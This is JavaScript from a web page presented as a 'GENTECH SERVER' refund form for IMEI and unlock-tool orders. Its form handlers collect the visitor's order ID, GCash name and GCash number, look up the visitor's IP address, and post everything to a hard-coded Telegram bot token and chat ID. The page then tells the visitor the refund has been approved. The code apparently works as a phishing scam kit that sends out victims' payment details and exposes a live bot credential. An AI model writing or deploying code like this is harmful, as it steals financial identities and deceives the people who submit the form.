        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return 'Unknown';
            }
        }

        function openModal(type, name) {
            document.getElementById('modalOverlay').style.display = 'block';
            if (type === 'imei') {
                document.getElementById('imeiModal').style.display = 'block';
                document.getElementById('imeiItemName').value = name;
            } else if (type === 'unlockTool') {
                document.getElementById('unlockToolModal').style.display = 'block';
                document.getElementById('unlockToolItemName').value = name;
            }
        }

        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
            document.getElementById('imeiModal').style.display = 'none';
            document.getElementById('unlockToolModal').style.display = 'none';
        }

        function sendToTelegram(message, successRedirectUrl) {
            const botToken = '7629739770:AAEvP7NK4M9Cua3X4norSzqQS2y2Edrdy3Q';
            const chatId = '6892566157';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
                .then(response => {
                    if (response.ok) {
                        window.location.href = successRedirectUrl;
                    } else {
                        alert("Failed to submit your order.");
                    }
                })
                .catch(error => console.error("Error:", error));
        }

        document.getElementById('imeiForm').addEventListener('submit', function (event) {
            event.preventDefault();
            getClientIP().then((customerIP) => {
                const itemName = document.getElementById('imeiItemName').value;
                const orderId = document.getElementById('imeiOrderId').value;
                const gcashName = document.getElementById('imeiGcashName').value;
                const gcashNumber = document.getElementById('imeiGcashNumber').value;

                const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱600\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

                sendToTelegram(message, 'success.html');
                closeModal();
            });
        });

        document.getElementById('unlockToolForm').addEventListener('submit', function (event) {
            event.preventDefault();
            getClientIP().then((customerIP) => {
                const itemName = document.getElementById('unlockToolItemName').value;
                const orderId = document.getElementById('unlockToolOrderId').value;
                const gcashName = document.getElementById('unlockToolGcashName').value;
                const gcashNumber = document.getElementById('unlockToolGcashNumber').value;

                const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

                sendToTelegram(message, 'success.html');
                closeModal();
            });
        });